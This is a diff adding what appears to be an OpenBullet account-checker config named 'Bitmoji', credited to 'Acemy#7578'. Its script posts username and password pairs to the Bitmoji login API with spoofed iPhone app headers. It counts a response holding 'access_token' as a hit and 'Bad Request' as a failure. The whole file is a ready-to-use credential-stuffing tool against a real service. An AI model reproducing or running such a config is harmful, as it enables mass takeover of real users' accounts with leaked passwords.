@@ -1,0 +1,42 @@
+[SETTINGS]
+{
+  "Name": "Bitmoji",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-24T13:15:06.851095+02:00",
+  "AdditionalInfo": "",
+  "Author": "Acemy#7578",
+  "Version": "1.0.2",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.bitmoji.com/user/login" 
+  CONTENT "client_id=imoji&client_secret=not%20used&grant_type=password&password=<PASS>&username=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: api.bitmoji.com" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Bitmoji-User-Agent: 1|com.bitstrips.imoji|10.55.40|iOS|12.0.1|iPhone9,3|4601EE57-AE7F-433B-86B8-4EFC80A08C98|2|de-DE" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: imoji/10.55 (iPhone; iOS 12.0.1; Scale/2.00)" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Bad Request" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+
